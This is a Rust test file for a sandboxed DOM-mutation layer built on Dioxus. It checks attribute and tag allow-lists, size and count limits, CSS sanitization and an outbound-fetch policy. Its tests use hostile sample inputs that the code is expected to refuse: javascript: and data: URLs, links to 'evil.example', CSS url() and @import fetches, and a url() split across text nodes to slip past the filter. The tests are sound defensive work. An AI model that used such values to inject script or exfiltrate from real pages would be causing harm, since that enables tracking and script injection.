        ("position", Some("style"), text("relative")),
        ("position", Some("style"), text("absolute")),
        // The presentation box contains fixed descendants, so these cannot escape it.
        ("position", Some("style"), text("fixed")),
        ("position", Some("style"), text("sticky")),
        // Raw style strings as standard Dioxus and the Pierre port write them.
        (
            "style",
            None,
            text("--diffs-annotation-min-height:0px; height: 120px"),
        ),
        ("style", None, text("overflow-anchor:none")),
        (
            "style",
            None,
            text("position:sticky;top:0;--x: calc(1px + 2px);"),
        ),
        ("width", Some("style"), text("calc(100% - 4px)")),
        ("font-family", Some("style"), text("system-ui, sans-serif")),
        ("opacity", Some("style"), AttributeValue::Float(0.5)),
    ];
    for (name, namespace, value) in admitted {
        let mut tree = SurfaceTree::new();
        tree.apply(&counter_initial_batch()).unwrap();
        let mut batch = set_attribute_batch(name, namespace, value.clone());
        batch.push(Mutation::Pop);
        tree.apply(&batch)
            .unwrap_or_else(|error| panic!("{name} {namespace:?} {value:?}: {error}"));
    }
}

#[test]
fn valid_static_attributes_namespaces_and_listeners_project_into_host_vdom() {
    #[derive(Clone, PartialEq)]
    struct Props {
        tree: SurfaceTree,
    }
    fn app(props: Props) -> Element {
        let dispatch: SurfaceEventHandler = Rc::new(|_| EventResponse::default());
        props.tree.render(
            &dispatch,
            &|_| unreachable!("test has no component slots"),
            &crate::ElementHandles::default(),
            false,
        )
    }
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateElement(("svg".into(), Some("http://www.w3.org/2000/svg".into()))),
        Mutation::SetAttribute((
            "viewBox".into(),
            None,
            AttributeValue::Text("0 0 24 24".into()),
        )),
        Mutation::CreateElement(("path".into(), Some("http://www.w3.org/2000/svg".into()))),
        Mutation::SetAttribute(("d".into(), None, AttributeValue::Text("M0 0L24 24".into()))),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
        Mutation::CreateElement(("input".into(), None)),
        Mutation::SetId(1),
        Mutation::SetAttribute((
            "aria-label".into(),
            None,
            AttributeValue::Text("Name".into()),
        )),
        Mutation::SetAttribute((
            "color".into(),
            Some("style".into()),
            AttributeValue::Text("red".into()),
        )),
        Mutation::SetAttribute(("value".into(), None, AttributeValue::Text("hello".into()))),
        Mutation::AddEventListener("input".into()),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree });
    let mut host_tree = SurfaceTree::new();
    dom.rebuild(&mut host_tree);
    assert!(host_tree.listener_id("input", "input").is_some());
    // Every presentation sits in a host-drawn box that contains layout and paint.
    let boxed = host_tree.node(host_tree.node(SurfaceNodeId::ROOT).children[0]);
    let SurfaceNodeKind::Element {
        tag, attributes, ..
    } = &boxed.kind
    else {
        panic!("the presentation box is an element");
    };
    assert_eq!(tag, "div");
    let box_style = attributes
        .get(&("style".to_owned(), None))
        .expect("the presentation box carries its style");
    assert!(
        matches!(box_style, AttributeValue::Text(style) if style.contains("contain:layout paint") && style.contains("overflow:clip"))
    );
    let svg = host_tree.node(boxed.children[0]);
    assert!(
        matches!(&svg.kind, SurfaceNodeKind::Element { tag, namespace: Some(namespace), .. }
        if tag == "svg" && namespace == "http://www.w3.org/2000/svg")
    );
}

#[test]
fn open_data_attributes_and_overflow_anchor_pass_ingress_and_render() {
    #[derive(Clone, PartialEq)]
    struct Props {
        tree: SurfaceTree,
    }
    fn app(props: Props) -> Element {
        let dispatch: SurfaceEventHandler = Rc::new(|_| EventResponse::default());
        props.tree.render(
            &dispatch,
            &|_| unreachable!("test has no component slots"),
            &crate::ElementHandles::default(),
            false,
        )
    }
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateElement(("div".into(), None)),
        Mutation::SetAttribute((
            "data-line-index".into(),
            None,
            AttributeValue::Text("3,1".into()),
        )),
        Mutation::SetAttribute((
            "overflow-anchor".into(),
            Some("style".into()),
            AttributeValue::Text("none".into()),
        )),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    // A refused batch poisons the tree, so each malformed name gets a fresh one.
    for bad in ["data-", "data-Line", "data-a:b", "data-a b"] {
        let error = SurfaceTree::new()
            .apply(&[
                Mutation::CreateElement(("div".into(), None)),
                Mutation::SetAttribute((bad.into(), None, AttributeValue::Text("x".into()))),
                Mutation::AppendChildren(1),
            ])
            .expect_err("malformed data-* name must be refused");
        assert_eq!(
            error,
            PresentationError::Unsupported(format!("attribute name or namespace: {bad} in None")),
            "{bad}"
        );
    }
    let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree });
    let mut host_tree = SurfaceTree::new();
    dom.rebuild(&mut host_tree);
    let presentation_box = host_tree.node(SurfaceNodeId::ROOT).children[0];
    let div = host_tree.node(host_tree.node(presentation_box).children[0]);
    let SurfaceNodeKind::Element { attributes, .. } = &div.kind else {
        panic!("expected an element")
    };
    assert_eq!(
        attributes.get(&("data-line-index".to_owned(), None)),
        Some(&AttributeValue::Text("3,1".into()))
    );
}

#[test]
fn a_later_stylesheet_replaces_the_earlier_one_and_is_sanitized_at_ingress() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[Mutation::SetStyleSheet(
        "a { color: red; background: url(x.png) }".into(),
    )])
    .unwrap();
    assert_eq!(tree.stylesheet, "a {\ncolor: red;\n}");
    tree.apply(&[Mutation::SetStyleSheet("b { margin: 0 }".into())])
        .unwrap();
    assert_eq!(tree.stylesheet, "b {\nmargin: 0;\n}");
    let oversized = "a { color: red }".repeat(SurfaceTree::MAX_STRING_BYTES);
    assert_eq!(
        SurfaceTree::new().apply(&[Mutation::SetStyleSheet(oversized)]),
        Err(PresentationError::Unsupported("string byte limit".into()))
    );
}

#[test]
fn a_stylesheet_is_charged_to_the_retained_budget_and_a_replacement_releases_its_bytes() {
    // Sheets already in the sanitizer's output form, so stored length equals raw length.
    let sheet = |len: usize| format!("a {{\n--p: {};\n}}", "x".repeat(len - 12));
    let mut tree = SurfaceTree::new();
    tree.apply(&[Mutation::SetStyleSheet(sheet(100))]).unwrap();
    assert_eq!(tree.retained_bytes, 100);
    // Fill the rest of the budget with text, leaving less than a full string of room.
    let text = [
        Mutation::CreateText("x".repeat(SurfaceTree::MAX_STRING_BYTES)),
        Mutation::AppendChildren(1),
    ];
    for _ in 0..SurfaceTree::MAX_RETAINED_BYTES / SurfaceTree::MAX_STRING_BYTES - 1 {
        tree.apply(&text).unwrap();
    }
    let leave = 1000;
    let left = SurfaceTree::MAX_RETAINED_BYTES - tree.retained_bytes - leave;
    tree.apply(&[
        Mutation::CreateText("x".repeat(left)),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let free = SurfaceTree::MAX_RETAINED_BYTES - tree.retained_bytes;
    assert_eq!(free, leave);
    // Replacing the 100-byte sheet releases it: the new one may use the free room plus those 100.
    let mut fits = tree.clone();
    fits.apply(&[Mutation::SetStyleSheet(sheet(free + 100))])
        .unwrap();
    assert_eq!(fits.retained_bytes, SurfaceTree::MAX_RETAINED_BYTES);
    // One byte more is refused.
    assert_eq!(
        tree.apply(&[Mutation::SetStyleSheet(sheet(free + 101))]),
        Err(PresentationError::Unsupported("retained byte limit".into()))
    );
}

#[test]
fn data_attribute_names_are_capped_per_surface() {
    let cap = SurfaceTree::MAX_DATA_ATTRIBUTE_NAMES;
    let set_names = |names: &mut dyn Iterator<Item = String>| {
        let mut batch = vec![Mutation::CreateElement(("div".into(), None))];
        batch
            .extend(names.map(|name| {
                Mutation::SetAttribute((name, None, AttributeValue::Text("x".into())))
            }));
        batch.push(Mutation::AppendChildren(1));
        batch
    };
    // Spread over batches: one element holds at most MAX_ATTRIBUTES_PER_NODE attributes.
    let mut surface = SurfaceTree::new();
    for chunk in (0..cap)
        .collect::<Vec<_>>()
        .chunks(SurfaceTree::MAX_ATTRIBUTES_PER_NODE)
    {
        let mut names = chunk.iter().map(|index| format!("data-cap-a{index}"));
        surface
            .apply(&set_names(&mut names))
            .expect("within the per-surface cap");
    }
    // Repeating names (including after other work) consumes no budget.
    let mut repeats =
        (0..SurfaceTree::MAX_ATTRIBUTES_PER_NODE).map(|index| format!("data-cap-a{index}"));
    surface
        .apply(&set_names(&mut repeats))
        .expect("repeats are free");
    // A second surface has its own budget, though it shares names with the first.
    let mut other = SurfaceTree::new();
    let mut fresh = ["data-cap-a0".to_owned(), "data-cap-b0".to_owned()].into_iter();
    other
        .apply(&set_names(&mut fresh))
        .expect("independent budget");
    // The 513th distinct name on the first surface is refused.
    let mut one_more = std::iter::once("data-cap-a-over".to_owned());
    assert_eq!(
        surface.apply(&set_names(&mut one_more)),
        Err(PresentationError::InvalidBatch(
            "too many distinct data-* attribute names on this surface".into()
        ))
    );
}

#[test]
fn replacing_values_and_removing_subtrees_release_retained_bytes() {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    for value in ["x".repeat(4096), "short".into()] {
        tree.apply(&[
            Mutation::PushId(1),
            Mutation::SetAttribute(("class".into(), None, AttributeValue::Text(value.clone()))),
            Mutation::AddEventListener("click".into()),
            Mutation::SetText(value),
            Mutation::Pop,
        ])
        .unwrap();
        assert_eq!(
            tree.retained_bytes,
            tree.nodes
                .iter()
                .flatten()
                .map(|node| SurfaceTree::kind_bytes(&node.kind))
                .sum::<usize>()
        );
    }
    tree.apply(&[
        Mutation::PushId(1),
        Mutation::SetAttribute(("class".into(), None, AttributeValue::None)),
        Mutation::RemoveEventListener("click".into()),
        Mutation::Remove,
    ])
    .unwrap();
    assert_eq!(tree.retained_bytes, 0);
    assert!(tree.is_empty());
    assert!(tree.apply(&[Mutation::PushId(2)]).is_err());
}

#[test]
fn per_node_attribute_and_listener_counts_are_bounded() {
    let names = [
        "id",
        "class",
        "title",
        "role",
        "tabindex",
        "hidden",
        "lang",
        "dir",
        "contenteditable",
        "draggable",
        "spellcheck",
        "translate",
        "value",
        "checked",
        "disabled",
        "readonly",
        "required",
        "multiple",
        "selected",
        "name",
        "type",
        "placeholder",
        "inputmode",
        "pattern",
        "min",
        "max",
        "step",
        "minlength",
        "maxlength",
        "size",
        "rows",
        "cols",
        "wrap",
        "for",
        "novalidate",
        "accept",
        "rel",
        "alt",
        "width",
        "height",
        "loading",
        "open",
        "datetime",
        "start",
        "reversed",
        "colspan",
        "rowspan",
        "data-testid",
        "data-state",
        "data-value",
        "aria-label",
        "aria-labelledby",
        "aria-describedby",
        "aria-hidden",
        "aria-live",
        "aria-atomic",
        "aria-busy",
        "aria-controls",
        "aria-current",
        "aria-disabled",
        "aria-expanded",
        "aria-haspopup",
        "aria-invalid",
        "aria-modal",
        "scope",
    ];
    assert_eq!(names.len(), SurfaceTree::MAX_ATTRIBUTES_PER_NODE + 1);
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateElement(("button".into(), None)),
        Mutation::SetId(1),
        Mutation::Pop,
    ])
    .unwrap();
    let mut batch = vec![Mutation::PushId(1)];
    batch.extend(
        names[..SurfaceTree::MAX_ATTRIBUTES_PER_NODE]
            .iter()
            .map(|name| Mutation::SetAttribute(((*name).into(), None, AttributeValue::Int(1)))),
    );
    batch.push(Mutation::Pop);
    tree.apply(&batch).unwrap();
    tree.apply(&[
        Mutation::PushId(1),
        Mutation::SetAttribute(("class".into(), None, AttributeValue::Int(2))),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(
        tree.apply(&[
            Mutation::PushId(1),
            Mutation::SetAttribute(("scope".into(), None, AttributeValue::Int(1)))
        ]),
        Err(PresentationError::Unsupported(
            "attribute count limit".into()
        ))
    );

    let names = [
        "copy",
        "cut",
        "paste",
        "compositionstart",
        "compositionupdate",
        "compositionend",
        "keydown",
        "keypress",
        "keyup",
        "focus",
        "blur",
        "focusin",
        "focusout",
        "change",
        "input",
        "invalid",
        "reset",
        "submit",
        "click",
        "contextmenu",
        "dblclick",
        "drag",
        "dragend",
        "dragenter",
        "dragexit",
        "dragleave",
        "dragover",
        "dragstart",
        "drop",
        "mousedown",
        "mouseenter",
        "mouseleave",
        "mousemove",
        "mouseout",
        "mouseover",
        "mouseup",
        "wheel",
    ];
    let supported: Vec<_> = names
        .into_iter()
        .filter(|name| supported_listener(name))
        .collect();
    assert!(supported.len() > SurfaceTree::MAX_LISTENERS_PER_NODE);
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateElement(("button".into(), None)),
        Mutation::SetId(1),
        Mutation::Pop,
    ])
    .unwrap();
    let mut batch = vec![Mutation::PushId(1)];
    batch.extend(
        supported[..SurfaceTree::MAX_LISTENERS_PER_NODE]
            .iter()
            .map(|name| Mutation::AddEventListener((*name).into())),
    );
    batch.push(Mutation::Pop);
    tree.apply(&batch).unwrap();
    tree.apply(&[
        Mutation::PushId(1),
        Mutation::AddEventListener(supported[0].into()),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(
        tree.apply(&[
            Mutation::PushId(1),
            Mutation::AddEventListener(supported[SurfaceTree::MAX_LISTENERS_PER_NODE].into())
        ]),
        Err(PresentationError::Unsupported(
            "listener count limit".into()
        ))
    );
}

#[test]
fn short_adversarial_instruction_sequences_preserve_invariants_without_unwinding() {
    let operations = [
        Mutation::PushId(0),
        Mutation::PushId(1),
        Mutation::PushId(2),
        Mutation::PushId(3),
        Mutation::SetId(0),
        Mutation::SetId(1),
        Mutation::SetId(3),
        Mutation::Child(0),
        Mutation::Child(1),
        Mutation::Pop,
        Mutation::CreateElement(("div".into(), None)),
        Mutation::CreateText("x".into()),
        Mutation::CloneNode,
        Mutation::AppendChildren(0),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(2),
        Mutation::ReplaceWith(0),
        Mutation::ReplaceWith(1),
        Mutation::InsertBefore(1),
        Mutation::InsertAfter(1),
        Mutation::SetAttribute(("class".into(), None, AttributeValue::None)),
        Mutation::SetText("text".into()),
        Mutation::AddEventListener("click".into()),
        Mutation::RemoveEventListener("click".into()),
        Mutation::Remove,
    ];
    let mut initial = SurfaceTree::new();
    initial.apply(&counter_initial_batch()).unwrap();
    for first in &operations {
        for second in &operations {
            for third in &operations {
                let mut tree = initial.clone();
                let batch = [first.clone(), second.clone(), third.clone()];
                match tree.apply(&batch) {
                    Ok(_) => {
                        assert!(tree.error().is_none(), "{batch:?}");
                        assert_eq!(tree.stack.len(), 1, "{batch:?}");
                        assert_eq!(tree.stack[0].node, SurfaceNodeId::ROOT, "{batch:?}");
                        assert_eq!(
                            tree.retained_bytes,
                            tree.nodes
                                .iter()
                                .flatten()
                                .map(|node| SurfaceTree::kind_bytes(&node.kind))
                                .sum::<usize>(),
                            "{batch:?}"
                        );
                        tree.text_content();
                    }
                    Err(error) => {
                        assert_eq!(tree.error(), Some(&error), "{batch:?}");
                        assert!(tree.is_empty(), "{batch:?}");
                        assert_eq!(
                            tree.apply(&[]),
                            Err(PresentationError::Revoked),
                            "{batch:?}"
                        );
                    }
                }
            }
        }
    }
}

#[test]
fn elements_leaving_the_tree_are_retired_by_id_through_remove_replace_steal_and_clear() {
    let create = |id: u32| {
        vec![
            Mutation::PushId(0),
            Mutation::CreateElement(("div".into(), None)),
            Mutation::SetId(id),
            Mutation::AppendChildren(1),
            Mutation::Pop,
        ]
    };
    let mut tree = SurfaceTree::new();
    for id in 1..=3 {
        tree.apply(&create(id)).unwrap();
    }
    assert!(tree.take_retired_elements().is_empty());
    // Remove.
    tree.apply(&[Mutation::PushId(1), Mutation::Remove])
        .unwrap();
    assert_eq!(tree.take_retired_elements(), [1].into());
    // ReplaceWith: the replaced element retires, its replacement does not.
    tree.apply(&[
        Mutation::PushId(2),
        Mutation::CreateElement(("span".into(), None)),
        Mutation::SetId(4),
        Mutation::ReplaceWith(1),
    ])
    .unwrap();
    assert_eq!(tree.take_retired_elements(), [2].into());
    // A recycled id taken by another node retires the node that held it.
    tree.apply(&[
        Mutation::PushId(0),
        Mutation::CreateElement(("div".into(), None)),
        Mutation::SetId(3),
        Mutation::AppendChildren(1),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.take_retired_elements(), [3].into());
    // Clear retires everything still in the tree.
    tree.clear();
    assert_eq!(tree.take_retired_elements(), [3, 4].into());
}

const SVG_NS: &str = "http://www.w3.org/2000/svg";
const XLINK_NS: &str = "http://www.w3.org/1999/xlink";

fn element(tag: &str, ns: Option<&str>) -> Mutation {
    Mutation::CreateElement((tag.into(), ns.map(str::to_owned)))
}

fn text_attr(name: &str, ns: Option<&str>, value: &str) -> Mutation {
    Mutation::SetAttribute((
        name.into(),
        ns.map(str::to_owned),
        AttributeValue::Text(value.into()),
    ))
}

/// What the retained bytes must equal for a lone `<style>` holding `text`.
fn style_bytes(text: &str) -> usize {
    "style".len() + text.len()
}

#[test]
fn every_admitted_tag_survives_ingress_and_projects_into_the_host_vdom() {
    #[derive(Clone, PartialEq)]
    struct Props {
        tree: SurfaceTree,
    }
    fn app(props: Props) -> Element {
        let dispatch: SurfaceEventHandler = Rc::new(|_| EventResponse::default());
        props.tree.render(
            &dispatch,
            &|_| unreachable!("test has no component slots"),
            &crate::ElementHandles::default(),
            false,
        )
    }
    let html = [
        "style",
        "slot",
        "bdi",
        "small",
        "b",
        "header",
        "code",
        "pre",
        "a",
        "button",
        "diffs-container",
    ];
    let svg = ["svg", "path", "symbol", "use"];
    let mut batch = Vec::new();
    for tag in html {
        batch.push(element(tag, None));
        batch.push(Mutation::AppendChildren(1));
    }
    for tag in svg {
        batch.push(element(tag, Some(SVG_NS)));
        batch.push(Mutation::AppendChildren(1));
    }
    let mut tree = SurfaceTree::new();
    tree.apply(&batch).unwrap();
    let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree: tree.clone() });
    let mut host_tree = SurfaceTree::new();
    dom.rebuild(&mut host_tree);
    // The host wraps the guest's nodes in its presentation box.
    assert_eq!(
        host_tree.outline(),
        format!("(div[data-clay-presentation,style]{})", tree.outline())
    );
    let presentation_box = host_tree.node(SurfaceNodeId::ROOT).children[0];
    let rendered = |index: usize| match &host_tree
        .node(host_tree.node(presentation_box).children[index])
        .kind
    {
        SurfaceNodeKind::Element { tag, namespace, .. } => (tag.clone(), namespace.clone()),
        other => panic!("expected an element, got {other:?}"),
    };
    assert_eq!(rendered(10), ("diffs-container".to_owned(), None));
    assert_eq!(rendered(14), ("use".to_owned(), Some(SVG_NS.to_owned())));
}

#[test]
fn custom_elements_carry_attributes_listeners_and_children_through_the_host_vdom() {
    #[derive(Clone, PartialEq)]
    struct Props {
        tree: SurfaceTree,
    }
    fn app(props: Props) -> Element {
        let dispatch: SurfaceEventHandler = Rc::new(|_| EventResponse::default());
        props.tree.render(
            &dispatch,
            &|_| unreachable!("test has no component slots"),
            &crate::ElementHandles::default(),
            false,
        )
    }
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        element("x-card", None),
        Mutation::SetId(1),
        text_attr("class", None, "c"),
        text_attr("data-k", None, "v"),
        Mutation::AddEventListener("click".into()),
        element("span", None),
        Mutation::CreateText("hi".into()),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree });
    let mut host_tree = SurfaceTree::new();
    dom.rebuild(&mut host_tree);
    assert_eq!(
        host_tree.outline(),
        "(div[data-clay-presentation,style](x-card[class,data-k](span(#))))"
    );
    assert_eq!(host_tree.text_content(), "hi");
    assert!(host_tree.listener_id("x-card", "click").is_some());
}

#[test]
fn custom_element_names_are_validated_and_capped_per_surface() {
    // A refused batch poisons the tree, so each bad name gets a fresh one.
    for bad in [
        "x",
        "X-card",
        "font-face",
        "annotation-xml",
        "x-é",
        "x card-a",
    ] {
        assert_eq!(
            SurfaceTree::new().apply(&[element(bad, None)]),
            Err(PresentationError::Unsupported(format!(
                "element tag or namespace: <{bad}> in None"
            ))),
            "{bad:?}"
        );
    }
    assert_eq!(
        SurfaceTree::new().apply(&[element("x-card", Some("urn:other"))]),
        Err(PresentationError::Unsupported(
            "element tag or namespace: <x-card> in Some(\"urn:other\")".into()
        ))
    );
    let create = |names: &mut dyn Iterator<Item = String>| {
        let mut batch = Vec::new();
        for name in names {
            batch.push(element(&name, None));
            batch.push(Mutation::AppendChildren(1));
        }
        batch
    };
    let cap = SurfaceTree::MAX_CUSTOM_ELEMENT_NAMES;
    let mut surface = SurfaceTree::new();
    let mut names = (0..cap).map(|index| format!("cap-a{index}"));
    surface
        .apply(&create(&mut names))
        .expect("within the per-surface cap");
    let mut repeats = (0..cap).map(|index| format!("cap-a{index}"));
    surface
        .apply(&create(&mut repeats))
        .expect("repeats are free");
    let mut other = SurfaceTree::new();
    let mut fresh = ["cap-a0".to_owned(), "cap-b0".to_owned()].into_iter();
    other
        .apply(&create(&mut fresh))
        .expect("independent budget");
    let mut one_more = std::iter::once("cap-over".to_owned());
    assert_eq!(
        surface.apply(&create(&mut one_more)),
        Err(PresentationError::InvalidBatch(
            "too many distinct custom element names on this surface".into()
        ))
    );
}

#[test]
fn custom_element_names_stay_charged_when_a_surface_is_cleared() {
    let cap = SurfaceTree::MAX_CUSTOM_ELEMENT_NAMES;
    let mut surface = SurfaceTree::new();
    let mut batch = Vec::new();
    for index in 0..cap {
        batch.push(element(&format!("clear-a{index}"), None));
        batch.push(Mutation::AppendChildren(1));
    }
    surface.apply(&batch).unwrap();
    surface.clear();
    assert!(surface.error().is_none());
    assert_eq!(
        surface.apply(&[element("clear-over", None)]),
        Err(PresentationError::InvalidBatch(
            "too many distinct custom element names on this surface".into()
        ))
    );
}

#[test]
fn style_text_is_sanitized_when_created_under_a_style_element() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        element("style", None),
        Mutation::CreateText(
            "a { color: red; background: url(https://x/y.png) } @import 'z';".into(),
        ),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let sanitized = "a {\ncolor: red;\n}";
    assert_eq!(tree.text_content(), sanitized);
    assert_eq!(tree.retained_bytes, style_bytes(sanitized));
}

#[test]
fn style_text_is_sanitized_on_set_text_of_the_text_node_and_of_the_element() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        element("style", None),
        Mutation::SetId(1),
        Mutation::CreateText("b { margin: 0 }".into()),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    assert_eq!(tree.text_content(), "b {\nmargin: 0;\n}");
    // SetText on the text node itself.
    tree.apply(&[
        Mutation::PushId(1),
        Mutation::Child(0),
        Mutation::SetText("c { background: image-set(url(x) 1x); color: blue }".into()),
        Mutation::Pop,
    ])
    .unwrap();
    let sanitized = "c {\ncolor: blue;\n}";
    assert_eq!(tree.text_content(), sanitized);
    assert_eq!(tree.retained_bytes, style_bytes(sanitized));
    // SetText on the style element replaces its children with a sanitized text node.
    tree.apply(&[
        Mutation::PushId(1),
        Mutation::SetText(
            "@font-face { src: url(f.woff) } d { cursor: url(c.png), auto; margin: 1px }".into(),
        ),
        Mutation::Pop,
    ])
    .unwrap();
    let sanitized = "d {\nmargin: 1px;\n}";
    assert_eq!(tree.text_content(), sanitized);
    assert_eq!(tree.retained_bytes, style_bytes(sanitized));
}

#[test]
fn text_moved_under_a_style_element_is_sanitized_on_every_attachment_path() {
    let raw = "a { background: url(x) ; color: red }";
    let sanitized = "a {\ncolor: red;\n}";
    // The text starts raw under a div, where it is plain text. Each attachment verb then moves
    // it under the style element.
    let setup = || {
        let mut tree = SurfaceTree::new();
        tree.apply(&[
            element("style", None),
            Mutation::SetId(1),
            element("div", None),
            Mutation::SetId(2),
            Mutation::CreateText(raw.into()),
            Mutation::AppendChildren(1),
            Mutation::AppendChildren(2),
        ])
        .unwrap();
        assert_eq!(tree.text_content(), raw, "outside a style it is only text");
        tree
    };
    let to_text = [Mutation::PushId(2), Mutation::Child(0)];
    // Append.
    let mut tree = setup();
    tree.apply(&[
        Mutation::PushId(1),
        to_text[0].clone(),
        to_text[1].clone(),
        Mutation::AppendChildren(1),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.text_content(), sanitized);
    assert_eq!(tree.retained_bytes, style_bytes(sanitized) + "div".len());
    // Insert after and before an existing child of the style element, and replace one.
    for verb in [
        Mutation::InsertAfter(1),
        Mutation::InsertBefore(1),
        Mutation::ReplaceWith(1),
    ] {
        let mut tree = setup();
        tree.apply(&[
            Mutation::PushId(1),
            Mutation::CreateText("x".into()),
            Mutation::AppendChildren(1),
            Mutation::Pop,
        ])
        .unwrap();
        // Replacing consumes the anchor from the stack; inserting leaves it to pop.
        let mut batch = vec![
            Mutation::PushId(1),
            Mutation::Child(0),
            Mutation::PushId(2),
            Mutation::Child(0),
            verb.clone(),
        ];
        if !matches!(verb, Mutation::ReplaceWith(_)) {
            batch.push(Mutation::Pop);
        }
        tree.apply(&batch).unwrap();
        assert!(
            tree.text_content().contains(sanitized) && !tree.text_content().contains("url"),
            "{verb:?}: {:?}",
            tree.text_content()
        );
    }
}

#[test]
fn style_text_that_would_only_form_a_fetching_rule_across_nodes_stays_sanitized_per_node() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        element("style", None),
        Mutation::CreateText("a { background: u".into()),
        Mutation::AppendChildren(1),
        Mutation::CreateText("rl(https://x/y) }".into()),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    assert!(
        !tree.text_content().contains("url"),
        "{:?}",
        tree.text_content()
    );
}

#[test]
fn style_elements_take_media_and_refuse_title_and_nonce() {
    let attr = |name: &str, value: &str| {
        SurfaceTree::new().apply(&[element("style", None), text_attr(name, None, value)])
    };
    // A lone element stays on the stack, so an accepted attribute still ends in an unbalanced
    // batch; what the cases below tell apart is whether the attribute itself is refused.
    let unbalanced = PresentationError::InvalidBatch("unbalanced final stack".into());
    assert_eq!(attr("media", "(min-width: 600px)"), Err(unbalanced));
    // `title` is refused by the style-specific rule, the others by the global vocabulary.
    for (refused, reason) in [
        ("title", "title on <style>"),
        ("nonce", "nonce in None"),
        ("blocking", "blocking in None"),
    ] {
        assert_eq!(
            attr(refused, "x"),
            Err(PresentationError::Unsupported(format!(
                "attribute name or namespace: {reason}"
            ))),
            "{refused}"
        );
    }
    // `media` means nothing on any other element.
    assert_eq!(
        SurfaceTree::new().apply(&[element("div", None), text_attr("media", None, "print")]),
        Err(PresentationError::Unsupported(
            "attribute name or namespace: media on <div>".into()
        ))
    );
}

#[test]
fn svg_use_admits_only_same_document_fragments() {
    let use_href = |ns: Option<&str>, value: AttributeValue| {
        SurfaceTree::new().apply(&[
            element("use", Some(SVG_NS)),
            Mutation::SetAttribute(("href".into(), ns.map(str::to_owned), value)),
            Mutation::AppendChildren(1),
        ])
    };
    for ns in [None, Some(XLINK_NS)] {
        assert!(use_href(ns, AttributeValue::Text("#sprite".into())).is_ok());
        assert!(use_href(ns, AttributeValue::None).is_ok(), "removal");
        for bad in [
            "https://example.com/a.svg#x",
            "//example.com/a.svg#x",
            "x.svg#y",
            "/x.svg#y",
            "data:image/svg+xml,<svg/>",
            "javascript:void(0)",
            " #x",
            "#",
            "",
        ] {
            assert_eq!(
                use_href(ns, AttributeValue::Text(bad.into())),
                Err(PresentationError::Unsupported(
                    "svg use href must be a same-document fragment".into()
                )),
                "{ns:?} {bad:?}"
            );
        }
        assert!(use_href(ns, AttributeValue::Int(1)).is_err());
    }
    // The rule is about `<use>`; other SVG elements keep their vocabulary.
    assert!(
        SurfaceTree::new()
            .apply(&[
                element("path", Some(SVG_NS)),
                text_attr("d", None, "M0 0"),
                Mutation::AppendChildren(1),
            ])
            .is_ok()
    );
}

#[test]
fn the_egress_policy_and_the_richer_vocabulary_compose_without_a_fetching_path() {
    let apply = |tag: &str, ns: Option<&str>, name: &str, attr_ns: Option<&str>, value: &str| {
        SurfaceTree::new().apply(&[
            element(tag, ns),
            text_attr(name, attr_ns, value),
            Mutation::AppendChildren(1),
        ])
    };
    // `xlink:href` is the legacy spelling of `href` and is only for SVG `<use>`, with a fragment.
    assert!(apply("use", Some(SVG_NS), "href", Some(XLINK_NS), "#a").is_ok());
    for (tag, ns) in [("a", None), ("path", Some(SVG_NS)), ("img", None)] {
        assert!(
            apply(tag, ns, "href", Some(XLINK_NS), "https://evil.example/").is_err(),
            "{tag}"
        );
        assert!(
            apply(tag, ns, "href", Some(XLINK_NS), "#a").is_err(),
            "{tag}"
        );
    }
    // `use` takes no absolute link even though `a` does; `a` takes no fragment or relative one.
    assert!(
        apply(
            "use",
            Some(SVG_NS),
            "href",
            None,
            "https://evil.example/a.svg#x"
        )
        .is_err()
    );
    assert!(apply("a", None, "href", None, "https://example.com/").is_ok());
    assert!(apply("a", None, "href", None, "#x").is_err());
    // Neither a custom element nor a `<style>` element reopens a raw `style` attribute, a `src`,
    // or an `action`.
    for tag in ["x-widget", "style", "slot", "bdi"] {
        for name in ["style", "src", "srcset", "action", "target"] {
            assert!(
                apply(tag, None, name, None, "https://evil.example/").is_err(),
                "{tag} {name}"
            );
        }
    }
    // `overflow-anchor` stays an allowed style property.
    assert!(apply("div", None, "overflow-anchor", Some("style"), "none").is_ok());
}
